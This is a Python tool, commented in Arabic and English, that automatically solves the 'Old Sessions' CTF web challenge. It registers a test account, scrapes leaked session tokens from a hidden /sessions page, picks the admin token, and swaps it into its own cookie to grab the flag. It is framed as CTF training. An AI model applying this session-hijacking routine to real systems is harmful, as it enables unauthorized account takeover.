# -*- coding: utf-8 -*-
"""
CTF Falcon - Web Session Audit
==============================================================================
وحدة مستقلة (بدون أي مكتبات خارجية) تُكمل مسار تحدي "Old Sessions"
وتستخرج العلم تلقائيًا، مع حفظ سلسلة الاستجابات كاملة وتحليل صحيح للكوكيز.

Standalone module (Python stdlib only) that completes the "Old Sessions"
web-exploitation challenge path on an *authorized, educational* CTF instance
and extracts the flag, while preserving the full response chain and doing
correct cookie analysis.

Design goals (مطابقة لطلب المشروع):
  - لا تثبيت لاسم المضيف/المنفذ/قيم الجلسة: كل شيء مشتق من الرابط المُدخل.
  - عدم متابعة التحويلات تلقائيًا: كل استجابة تُطلب وتُحفظ على حدة، لأن
    الاستجابات الوسيطة تحمل أدلة (الصفحة الرئيسية تُنشئ كوكي، وصفحة الدخول تحذفها).
  - تصحيح تحليل الكوكيز محفوظ: Max-Age <= 0 = طلب حذف، لا "دائمة".
  - نمط العلم قابل للتهيئة (افتراضيًا picoCTF{...} وأنماط شائعة أخرى).

Public API:
    run_audit(url, **options) -> dict     # يُستدعى من falcon_local.py
    analyze_set_cookie(raw) -> dict        # تحليل كوكي واحد

CLI:
    python web_session_audit.py http://host:port/
==============================================================================
"""
from __future__ import annotations

import json
import re
import ssl
import sys
import http.client
import secrets
from datetime import datetime, timezone
from email.utils import parsedate_to_datetime
from urllib.parse import urlsplit, urlencode, urljoin

__version__ = "2.2.0"

# --------------------------------------------------------------------------- #
#  إعدادات افتراضية                                                            #
# --------------------------------------------------------------------------- #
DEFAULT_FLAG_PATTERNS = [
    r"picoCTF\{[^}]+\}",
    r"flag\{[^}]+\}",
    r"FLAG\{[^}]+\}",
    r"CTF\{[^}]+\}",
    # نمط عام: بادئة قصيرة ثم {...} — يُستخدم كملاذ أخير
    r"[A-Za-z0-9_]{2,12}\{[^}]{3,}\}",
]
DEFAULT_TIMEOUT = 15
USER_AGENT = f"CTF-Falcon-WebAudit/{__version__} (educational; authorized-CTF-only)"


# --------------------------------------------------------------------------- #
#  عميل HTTP بسيط لا يتبع التحويلات ويحفظ الكوكيز يدويًا                        #
# --------------------------------------------------------------------------- #
class HttpClient:
    """
    عميل HTTP خفيف مبني على http.client.
    - لا يتبع أي تحويل (302/301/...) تلقائيًا.
    - يحفظ Set-Cookie متعددة ويطبّق دلالات الحذف بشكل صحيح.
    """

    def __init__(self, timeout=DEFAULT_TIMEOUT, insecure_tls=False):
        self.timeout = timeout
        self.insecure_tls = insecure_tls
        self.cookies: dict[str, str] = {}

    # -- كوكيز -------------------------------------------------------------- #
    def cookie_header(self) -> str:
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())

    def apply_set_cookies(self, analyzed_cookies: list[dict]) -> list[str]:
        """
        يطبّق نتائج تحليل Set-Cookie على مخزن الكوكيز (إضافة/تحديث/حذف)،
        ويعيد قائمة رسائل عربية توضح ما جرى (للأدلة التعليمية).
        """
        notes = []
        for c in analyzed_cookies:
            name = c["name"]
            if c["intent"] == "deletion":
                if name in self.cookies:
                    del self.cookies[name]
                    notes.append(f"حُذفت الكوكي «{name}» بناءً على طلب الخادم (Max-Age<=0 أو Expires ماضٍ).")
                else:
                    notes.append(f"طلب الخادم حذف كوكي «{name}» غير موجودة أصلًا لدينا.")
            else:
                self.cookies[name] = c["value"]
                notes.append(f"خُزّنت/حُدّثت الكوكي «{name}».")
        return notes

    # -- طلب ---------------------------------------------------------------- #
    def request(self, method: str, url: str, body: str | None = None,
                extra_headers: dict | None = None) -> dict:
        parts = urlsplit(url)
        scheme = parts.scheme or "http"
        host = parts.hostname
        port = parts.port or (443 if scheme == "https" else 80)
        origin=(scheme,host,port)
        if parts.username or parts.password or scheme not in ("http","https"):
            raise ValueError("Invalid challenge URL")
        if hasattr(self,"origin") and self.origin!=origin:
            raise ValueError("Cross-origin challenge request blocked")
        self.origin=origin
        path = parts.path or "/"
        if parts.query:
            path += "?" + parts.query

        if scheme == "https":
            ctx = ssl.create_default_context()
            if self.insecure_tls:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=self.timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=self.timeout)

        headers = {
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,*/*",
            "Connection": "close",
        }
        if self.cookies:
            headers["Cookie"] = self.cookie_header()
        if body is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Content-Length"] = str(len(body.encode("utf-8")))
        if extra_headers:
            headers.update(extra_headers)

        try:
            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            raw_headers = resp.getheaders()          # يحفظ Set-Cookie المتعددة
            raw_body = resp.read(2*1024*1024+1)
            if len(raw_body)>2*1024*1024:
                raise ValueError("Response exceeds 2 MB")
            status = resp.status
            reason = resp.reason
        finally:
            conn.close()

        text = raw_body.decode("utf-8", errors="replace")
        set_cookie_raw = [v for (k, v) in raw_headers if k.lower() == "set-cookie"]
        location = next((v for (k, v) in raw_headers if k.lower() == "location"), None)

        return {
            "method": method,
            "url": url,
            "request_cookies": dict(self.cookies),
            "status": status,
            "reason": reason,
            "location": location,
            "set_cookie_raw": set_cookie_raw,
            "headers": raw_headers,
            "body": text,
        }


# --------------------------------------------------------------------------- #
#  تحليل الكوكيز (التصحيح المطلوب محفوظ هنا)                                    #
# --------------------------------------------------------------------------- #
def _parse_cookie_attrs(raw: str):
    """يفصل الكوكي إلى (name, value, attrs)."""
    segments = [s.strip() for s in raw.split(";") if s.strip() != ""]
    if not segments:
        return "", "", {}
    first = segments[0]
    if "=" in first:
        name, value = first.split("=", 1)
    else:
        name, value = first, ""
    attrs = {}
    for seg in segments[1:]:
        if "=" in seg:
            k, v = seg.split("=", 1)
            attrs[k.strip().lower()] = v.strip()
        else:
            attrs[seg.strip().lower()] = True
    return name.strip(), value.strip(), attrs


def analyze_set_cookie(raw: str) -> dict:
    """
    يحلّل ترويسة Set-Cookie واحدة ويحدد النية (set / deletion) بشكل صحيح.

    القواعد (كما طُلب):
      * Max-Age <= 0  => طلب حذف الكوكي (وليست "دائمة").
      * عند غياب Max-Age، تاريخ Expires ماضٍ => انتهاء صلاحية/حذف.
      * تاريخ انتهاء بعيد وحده لا يثبت أن جلسة المصادقة لا تنتهي على الخادم.
      * غياب HttpOnly / Secure / SameSite ملاحظات هاردنينج منفصلة، ولا يثبت
        أيٌّ منها وحده إمكانية استخراج العلم.
    """
    name, value, attrs = _parse_cookie_attrs(raw)
    notes: list[str] = []
    intent = "set"
    lifetime_seconds = None
    expires_dt = None

    now = datetime.now(timezone.utc)

    # 1) Max-Age له الأولوية على Expires حسب المواصفة
    if "max-age" in attrs and attrs["max-age"] is not True:
        try:
            ma = int(str(attrs["max-age"]).strip())
            lifetime_seconds = ma
            if ma <= 0:
                intent = "deletion"
                notes.append("Max-Age <= 0: هذا طلب حذف للكوكي (وليست دائمة).")
            else:
                notes.append(f"Max-Age = {ma} ثانية: عمر محدد للكوكي في المتصفح.")
        except ValueError:
            notes.append("قيمة Max-Age غير صالحة؛ تم تجاهلها.")

    # 2) Expires (يُنظر إليه إذا لم يحسم Max-Age الأمر)
    if "expires" in attrs and attrs["expires"] is not True:
        try:
            expires_dt = parsedate_to_datetime(str(attrs["expires"]))
            if expires_dt.tzinfo is None:
                expires_dt = expires_dt.replace(tzinfo=timezone.utc)
            if intent != "deletion" and lifetime_seconds is None:
                if expires_dt <= now:
                    intent = "deletion"
                    notes.append("Expires في الماضي: الكوكي منتهية/محذوفة.")
                else:
                    years = (expires_dt - now).days / 365.25
                    notes.append(f"Expires في المستقبل (~{years:.1f} سنة): كوكي دائمة على المتصفح.")
                    notes.append("تنبيه: تاريخ الانتهاء البعيد وحده لا يثبت أن جلسة المصادقة "
                                 "لا تنتهي على الخادم؛ يجب التحقق من سلوك الخادم.")
        except (TypeError, ValueError):
            notes.append("تعذّر تحليل قيمة Expires؛ تم تجاهلها.")

    # 3) كوكي جلسة (لا Max-Age ولا Expires)
    if intent == "set" and lifetime_seconds is None and expires_dt is None:
        notes.append("لا Max-Age ولا Expires: كوكي جلسة تُحذف بإغلاق المتصفح.")

    # 4) قيمة فارغة + نية حذف = تأكيد إزالة
    if intent == "deletion" and value == "":
        notes.append("القيمة فارغة مع نية الحذف: إزالة واضحة للكوكي.")

    # 5) ملاحظات هاردنينج منفصلة (لا تُثبت وحدها استخراج العلم)
    flags = {
        "httponly": "httponly" in attrs,
        "secure": "secure" in attrs,
        "samesite": attrs.get("samesite") if "samesite" in attrs else None,
    }
    hardening = []
    if not flags["httponly"]:
        hardening.append("HttpOnly غائبة: الكوكي مقروءة بـ JavaScript (ملاحظة منفصلة).")
    if not flags["secure"]:
        hardening.append("Secure غائبة: قد تُرسل عبر HTTP غير المشفّر (ملاحظة منفصلة).")
    if flags["samesite"] is None:
        hardening.append("SameSite غير محددة: اعتبارات CSRF (ملاحظة منفصلة).")
    if hardening:
        hardening.append("أيٌّ من هذه وحده لا يثبت إمكانية استخراج العلم.")

    return {
        "raw": raw,
        "name": name,
        "value": value,
        "attrs": attrs,
        "intent": intent,                    # "set" | "deletion"
        "lifetime_seconds": lifetime_seconds,
        "expires": expires_dt.isoformat() if expires_dt else None,
        "httponly": flags["httponly"],
        "secure": flags["secure"],
        "samesite": flags["samesite"],
        "notes_ar": notes,
        "hardening_ar": hardening,
    }


def analyze_response_cookies(resp: dict) -> list[dict]:
    return [analyze_set_cookie(raw) for raw in resp.get("set_cookie_raw", [])]


# --------------------------------------------------------------------------- #
#  أدوات تحليل صفحات التحدي                                                     #
# --------------------------------------------------------------------------- #
def find_form_fields(html: str) -> list[str]:
    """أسماء حقول <input name="...">."""
    return re.findall(r'<input[^>]*\bname\s*=\s*["\']([^"\']+)["\']', html, re.I)


def find_sessions_hint(html: str) -> str | None:
    """
    يبحث عن المسار المُلمّح إليه في التعليقات، مثل:
    'Hey I found a strange page at /sessions'
    ولا يثبّت /sessions إجباريًا.
    """
    m = re.search(r'strange page at\s+(/[\w\-/\.]*)', html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'\bat\s+(/sessions\b[\w\-/\.]*)', html, re.I)
    if m:
        return m.group(1)
    if "/sessions" in html:
        return "/sessions"
    return None


_SESSION_LINE_RE = re.compile(r'session\s*:\s*([^\s,<]+)\s*,\s*(\{.*?\}|.+?)(?:</p>|<br|\n|$)',
                              re.I | re.S)


def parse_sessions_dump(html: str) -> list[dict]:
    """
    يحلّل صفحة /sessions إلى قائمة إدخالات:
      { "token": "...", "decoded": "{'_permanent': True, ...}" }
    يعمل مع الصيغة: "1) session:TOKEN, {'_permanent': ...}"
    """
    entries = []
    for m in _SESSION_LINE_RE.finditer(html):
        token = m.group(1).strip().strip(",")
        decoded = m.group(2).strip()
        entries.append({"token": token, "decoded": decoded})
    return entries


_ADMIN_HINTS = [
    (re.compile(r"['\"]admin['\"]\s*:\s*true", re.I), 5),
    (re.compile(r"\badmin\s*=\s*true", re.I), 5),
    (re.compile(r"['\"](?:username|user|name)['\"]\s*:\s*['\"]admin['\"]", re.I), 4),
    (re.compile(r"['\"]role['\"]\s*:\s*['\"]admin['\"]", re.I), 4),
    (re.compile(r"\badmin\b", re.I), 1),
    (re.compile(r"['\"]is_admin['\"]\s*:\s*true", re.I), 5),
]


def pick_admin_entry(entries: list[dict], own_token: str | None) -> dict | None:
    """يختار الإدخال الأرجح أنه جلسة المشرف بالاعتماد على محتوى القاموس المفكوك."""
    best, best_score = None, 0
    for e in entries:
        if own_token and e["token"] == own_token:
            continue  # ليست جلستنا العادية
        score = sum(w for rx, w in _ADMIN_HINTS if rx.search(e["decoded"]))
        if score > best_score:
            best, best_score = e, score
    # ملاذ أخير: إن لم نجد إشارة "admin" واضحة، اختر أول جلسة ليست جلستنا
    if best is None:
        for e in entries:
            if not own_token or e["token"] != own_token:
                return e
    return best


def extract_flag(bodies: list[tuple[str, str]], patterns: list[str]) -> tuple[str | None, str | None]:
    """
    يبحث عن العلم عبر عدة أجسام استجابة بالترتيب.
    bodies: قائمة (label, body). يعيد (flag, source_label).
    """
    compiled = [re.compile(p) for p in patterns]
    for label, body in bodies:
        for rx in compiled:
            m = rx.search(body)
            if m:
                return m.group(0), label
    return None, None


# --------------------------------------------------------------------------- #
#  المدقّق الرئيسي: مسار Old Sessions كاملًا                                    #
# --------------------------------------------------------------------------- #
def run_audit(url: str,
              flag_patterns: list[str] | None = None,
              timeout: int = DEFAULT_TIMEOUT,
              insecure_tls: bool = False,
              demonstrate_register_requirement: bool = True,
              username: str | None = None,
              password: str | None = None) -> dict:
    """
    يشغّل مسار تحدي Old Sessions على رابط Instance مُصرّح به تعليميًا،
    ويعيد قاموسًا يشمل سلسلة الاستجابات، الأدلة، والعلم المستخرج.

    ملاحظة أخلاقية: هذه الأداة للتدريب على تحديات CTF المصرّح بها فقط.
    """
    flag_patterns = flag_patterns or DEFAULT_FLAG_PATTERNS
    if not re.match(r"^https?://", url, re.I):
        url = "http://" + url
    base = url if url.endswith("/") else url + "/"

    # بيانات حساب تجريبي عشوائية (لا تُثبَّت في الكود)
    username = username or ("falcon_" + secrets.token_hex(4))
    password = password or secrets.token_hex(8)

    client = HttpClient(timeout=timeout, insecure_tls=insecure_tls)
    steps: list[dict] = []
    warnings: list[str] = []
    bodies_for_flag: list[tuple[str, str]] = []

    def record(resp: dict, note_lines: list[str]) -> dict:
        analyzed = analyze_response_cookies(resp)
        jar_notes = client.apply_set_cookies(analyzed)
        step = {
            "n": len(steps) + 1,
            "method": resp["method"],
            "url": resp["url"],
            "request_cookies": resp["request_cookies"],
            "status": resp["status"],
            "reason": resp["reason"],
            "location": resp["location"],
            "set_cookies": analyzed,
            "body_snippet": resp["body"][:600],
            "notes_ar": note_lines + jar_notes,
        }
        steps.append(step)
        bodies_for_flag.append((f"step{step['n']}:{resp['method']} {urlsplit(resp['url']).path}", resp["body"]))
        return step

    explanation: list[str] = []

    # (1) الصفحة الرئيسية دون تسجيل دخول — نتوقع 302 إلى /login وإنشاء كوكي
    r1 = client.request("GET", base)
    record(r1, ["طلب الصفحة الرئيسية دون جلسة: نتوقع تحويلًا إلى /login وإنشاء كوكي جلسة."])
    explanation.append("1) الصفحة الرئيسية تُنشئ كوكي جلسة (غالبًا بتاريخ انتهاء بعيد) ثم تُحوّل إلى /login.")

    login_url = urljoin(base, r1["location"] or "/login")

    # (2) صفحة /login — نتوقع 200 وحذف الكوكي (الدليل الذي يخفيه اتباع التحويل)
    r2 = client.request("GET", login_url)
    s2 = record(r2, ["صفحة /login: نتوقع 200 مع طلب حذف كوكي الجلسة (Max-Age=0)."])
    explanation.append("2) صفحة /login تحذف كوكي الجلسة (Max-Age=0). "
                       "لهذا لا نتبع التحويلات تلقائيًا: الحذف دليل يظهر فقط في الاستجابة الوسيطة.")

    # (3) صفحة /register واكتشاف الحقول
    register_url = urljoin(base, "/register")
    r3 = client.request("GET", register_url)
    reg_fields = find_form_fields(r3["body"])
    record(r3, [f"صفحة /register: الحقول المكتشفة = {reg_fields or 'غير معروفة'}."])

    # (اختياري تعليميًا) إثبات أن conf_password مطلوب: إرسال ناقص يُعيد 400
    if demonstrate_register_requirement:
        r3b = client.request("POST", register_url,
                             body=urlencode({"username": username, "password": password}))
        record(r3b, ["إثبات المتطلب: إرسال username+password فقط (بدون conf_password) — نتوقع 400."])
        if r3b["status"] != 400:
            warnings.append("لم يُعِد التسجيل الناقص 400 كما في مثالنا؛ قد يختلف هذا الـ Instance.")

    # (4) تسجيل صحيح مع conf_password — نتوقع تحويلًا إلى /login
    reg_body = urlencode({"username": username, "password": password, "conf_password": password})
    r4 = client.request("POST", register_url, body=reg_body)
    record(r4, ["تسجيل صحيح مع conf_password: نتوقع 302 إلى /login."])
    explanation.append("3) أنشأنا حسابًا تجريبيًا (conf_password مطلوب، وإلا 400).")

    # (5) تسجيل الدخول — نتوقع 302 إلى / وإنشاء كوكي جلسة طويلة الصلاحية
    login_post_url = urljoin(base, "/login")
    r5 = client.request("POST", login_post_url,
                        body=urlencode({"username": username, "password": password}))
    record(r5, ["تسجيل الدخول: نتوقع 302 إلى / وكوكي جلسة طويلة."])
    own_token = client.cookies.get("session")
    explanation.append("4) سجّلنا الدخول وحصلنا على كوكي جلسة طويلة الصلاحية للحساب التجريبي.")

    # (6) الصفحة الرئيسية بعد الدخول — نبحث عن التلميح إلى /sessions
    r6 = client.request("GET", base)
    hint = find_sessions_hint(r6["body"])
    record(r6, [f"الصفحة الرئيسية بعد الدخول: التلميح المكتشف = {hint or 'غير موجود'}."])
    explanation.append(f"5) الصفحة الرئيسية تكشف تلميحًا لصفحة مخفية: {hint or '/sessions'}.")

    sessions_url = urljoin(base, hint or "/sessions")

    # (7) صفحة /sessions — تسريب جلسات الخادم بما فيها جلسة المشرف
    r7 = client.request("GET", sessions_url)
    record(r7, ["صفحة /sessions: نتوقع تسريب قائمة جلسات الخادم."])
    entries = parse_sessions_dump(r7["body"])
    admin = pick_admin_entry(entries, own_token)
    explanation.append(f"6) صفحة {hint or '/sessions'} تسرّب جلسات الخادم "
                       f"(عدد الإدخالات: {len(entries)})، ومنها جلسة المشرف.")

    admin_token = admin["token"] if admin else None
    result_flag = None
    flag_source = None

    if not admin_token:
        warnings.append("لم أستطع تحديد جلسة المشرف من صفحة /sessions؛ راجِع body_snippet للخطوة.")
    else:
        # (8) انتحال جلسة المشرف: نضع كوكي session = رمز المشرف ثم نطلب /
        client.cookies["session"] = admin_token
        r8 = client.request("GET", base)
        record(r8, ["انتحال جلسة المشرف: ضبط كوكي session على رمز المشرف ثم طلب /."])
        explanation.append("7) استبدلنا كوكي جلستنا برمز جلسة المشرف المسرّب، فأصبحنا مشرفين.")

        # قد يظهر العلم في / (كمشرف) أو مباشرة في تفريغ /sessions
        result_flag, flag_source = extract_flag(bodies_for_flag, flag_patterns)
        if result_flag:
            explanation.append(f"8) استُخرج العلم من {flag_source}.")

    if not result_flag:
        # محاولة أخيرة: ابحث في كل الأجسام (قد يكون العلم داخل تفريغ /sessions)
        result_flag, flag_source = extract_flag(bodies_for_flag, flag_patterns)
        if result_flag:
            explanation.append(f"8) استُخرج العلم من {flag_source}.")

    success = result_flag is not None

    return {
        "tool": "CTF Falcon - Web Session Audit",
        "version": __version__,
        "challenge": "Old Sessions (Web Exploitation)",
        "target": base,
        "started_at": datetime.now(timezone.utc).isoformat(),
        "success": success,
        "flag": result_flag,
        "flag_source": flag_source,
        "test_account": {"username": username},   # كلمة المرور لا تُعاد
        "discovered": {
            "login_url": login_url,
            "register_fields": reg_fields,
            "sessions_hint": hint,
            "sessions_url": sessions_url,
            "sessions_count": len(entries),
            "own_session_token": own_token,
            "admin_session_token": admin_token,
            "admin_session_decoded": admin["decoded"] if admin else None,
        },
        "steps": steps,
        "explanation_ar": explanation,
        "warnings": warnings,
        "note": "أداة تعليمية لتحديات CTF المصرّح بها فقط؛ لا تُرسل العلم تلقائيًا.",
    }


# --------------------------------------------------------------------------- #
#  CLI                                                                          #
# --------------------------------------------------------------------------- #
def _main(argv: list[str]) -> int:
    if len(argv) < 2 or argv[1] in ("-h", "--help"):
        print("Usage: python web_session_audit.py <instance-url> [--json]")
        print("مثال: python web_session_audit.py http://host:port/")
        return 0
    url = argv[1]
    as_json = "--json" in argv[2:]
    try:
        result = run_audit(url)
    except (OSError, http.client.HTTPException) as e:
        print(f"[خطأ اتصال] تعذّر الوصول إلى {url}: {e}", file=sys.stderr)
        print("تحقّق من أن رابط الـ Instance ما زال فعّالًا.", file=sys.stderr)
        return 2

    if as_json:
        print(json.dumps(result, ensure_ascii=False, indent=2))
        return 0 if result["success"] else 1

    # عرض عربي مبسّط للطالب
    print("=" * 68)
    print(f"CTF Falcon — Web Session Audit v{result['version']}")
    print(f"التحدي : {result['challenge']}")
    print(f"الهدف  : {result['target']}")
    print("=" * 68)
    for s in result["steps"]:
        loc = f"  ->  {s['location']}" if s["location"] else ""
        print(f"\n[{s['n']}] {s['method']} {urlsplit(s['url']).path}  =>  {s['status']} {s['reason']}{loc}")
        for c in s["set_cookies"]:
            print(f"    Set-Cookie: {c['name']}  [{c['intent']}]")
            for note in c["notes_ar"]:
                print(f"      - {note}")
        for note in s["notes_ar"]:
            print(f"    • {note}")
    print("\n" + "-" * 68)
    print("الشرح:")
    for line in result["explanation_ar"]:
        print("  " + line)
    if result["warnings"]:
        print("\nتحذيرات:")
        for w in result["warnings"]:
            print("  ! " + w)
    print("-" * 68)
    if result["success"]:
        print(f"\n✅ العلم: {result['flag']}   (المصدر: {result['flag_source']})")
        print("انسخ العلم بنفسك إلى منصة المسابقة.")
    else:
        print("\n❌ لم يُستخرج العلم تلقائيًا. راجِع الخطوات أعلاه والأدلة.")
    print("=" * 68)
    return 0 if result["success"] else 1


if __name__ == "__main__":
    raise SystemExit(_main(sys.argv))
